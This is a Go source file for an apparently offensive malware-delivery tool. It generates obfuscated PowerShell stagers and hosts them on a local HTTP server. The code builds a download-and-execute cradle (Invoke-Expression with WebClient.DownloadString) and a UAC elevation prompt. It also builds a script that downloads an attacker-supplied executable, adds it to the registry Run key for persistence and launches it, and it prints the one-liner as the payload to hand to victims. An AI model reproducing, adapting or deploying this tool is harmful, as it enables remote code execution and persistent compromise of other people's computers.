package main

import (
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

func randomstring(num int) string {
	rand.Seed(time.Now().UTC().UnixNano())

	var table string
	table += "abcdefghijklmnopqrstuvwxyz"
	table += strings.ToUpper(table)

	var splitted []string = strings.Split(table, "")

	var result string
	for i:=0;i<num;i++ {
		result += splitted[rand.Intn(len(splitted) - 1)]
	}

	return result
}

func powershell_isetup(url string, extension string) string {
	return `	   
$x=$(random 99999999999999)

$__ = '`+url+`'
$y = "`+extension+`"

$________ = "$env:???\$x.$y"

$__________ = 'system32'
$____________ = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'

Set-Alias -Name ____ -Value Set-Alias

____ -Name _____ -Value New-ScheduledTaskTrigger
____ -Name ________ -Value New-ScheduledTaskSettingsSet
____ -Name ______ -Value New-ScheduledTaskAction
____ -Name _______________ -Value New-Object
____ -Name __________ -Value Register-ScheduledTask
____ -Name _______ -Value Set-ItemProperty
____ -Name _________ -Value New-ScheduledTask

(_______________ System.Net.WebClient).DownloadFile($__, $________)

_______ -path $____________  -Name $__________ -value $________

start $________
`
}

func grab_admin() string {
	return `if(!([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
		Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList "-File `+"`"+`"$($MyInvocation.MyCommand.Path)`+"`"+`"  `+"`"+`"$($MyInvocation.MyCommand.UnboundArguments)`+"`"+`""
		Exit
	}`
}

func powershell_installer(url string) string {
	var rifile string = randomstring(16)
	return `curl `+url+` -o `+rifile+`.ps1; .\`+rifile+`.ps1`
}

func powershell_gconout(url string) string {
	return `Invoke-Expression (New-Object System.Net.WebClient).DownloadString("`+url+`")`
}

func main() {
	fmt.Printf(logo)

	fmt.Println(Fore["RED"]+"[-] DELETING old scripts"+Fore["RESET"])
	
	err := filepath.Walk(".", func(path string, info os.FileInfo, err error) error {
        if err != nil {
            return err
        }
        if info.IsDir() && strings.HasPrefix(info.Name(), "spread_") {
            err = os.RemoveAll(path)

            if err != nil {
                return err
            }
        }
        return nil
    })

    if err != nil {
        fmt.Println(Fore["RED"]+"[-] "+err.Error()+Fore["RESET"])
    }

	// 93.156.61.60@exploit.exe

	if len(os.Args) > 1 {
		if strings.Contains(os.Args[1], "@") {

		}
	} else {
		log.Fatal("Missing argument")
	}

	var public_addrr string = "www.myserver.com"
	var exploit_path string = "/path/to/exploit"

	if len(os.Args) > 1 {
		if strings.Contains(os.Args[1], "@") {
			public_addrr = strings.Split(os.Args[1], "@")[0]
			exploit_path = strings.Split(os.Args[1], "@")[1]
		}
	} else {
		log.Fatal("Missing argument")
	}

	_ = exploit_path

	var directory string = "spread_" + randomstring(16)
	var exploit_ur string = randomstring(16) + ".exe"
	var isetup_ur string = randomstring(16) + ".ps1"
	var installer_ur string = randomstring(16) + ".ps1"

	if err := os.Mkdir(directory, os.ModePerm); err != nil {
        log.Fatal(err)
    }

	fmt.Println(Fore["BLUE"]+"[*] Generating and Obfuscating powershell payloads"+Fore["RESET"])

	var isetup string = grab_admin()+"\n\n"+pogofuscate(powershell_isetup("http://"+public_addrr+"/"+exploit_ur, ".exe"))
	var installer string = pogofuscate(powershell_installer("http://"+public_addrr+"/"+isetup_ur))

	var conout string = pogofuscate(powershell_gconout("http://"+public_addrr+"/"+installer_ur))

	fmt.Println(Fore["BLUE"]+"[*] Writing to files"+Fore["RESET"])

	f, err := os.Create(directory+"/"+isetup_ur); if err != nil {
        log.Fatal(err)
    }
    defer f.Close()
    _, err2 := f.WriteString(fmt.Sprintf(isetup)); if err2 != nil {
        log.Fatal(err2)
    }; f.Close()


	x, xerr := os.Create(directory+"/"+installer_ur); if xerr != nil {
        log.Fatal(xerr)
    }
    defer x.Close()
    _, xerr2 := x.WriteString(fmt.Sprintf(installer)); if xerr2 != nil {
        log.Fatal(xerr2)
    }; x.Close()

	o, oxerr := os.Create(directory+"/index.html"); if oxerr != nil {
        log.Fatal(oxerr)
    }
    defer x.Close()
    _, oxerr2 := o.WriteString(fmt.Sprintf("GUGU GAGA")); if oxerr2 != nil {
        log.Fatal(oxerr2)
    }; o.Close()

	cpCmd := exec.Command("cp", "-rf", exploit_path, directory+"/"+exploit_ur)
	cpCmd.Run()

	if err != nil {
		log.Fatal(err.Error())
	}

	fmt.Println(Fore["GREEN"]+"[+] Completed"+Fore["RESET"])
	
	fmt.Printf(Fore["YELLOW"]+"[PAYLOAD] "+Fore["LIGHT_YELLOW"]+conout+"\n"+Fore["RESET"])

	fmt.Println(Fore["BLUE"]+"[*] Starting HTTP server"+Fore["RESET"])

	http.Handle("/", http.FileServer(http.Dir(directory)))
    log.Fatal(http.ListenAndServe(":80", nil))
}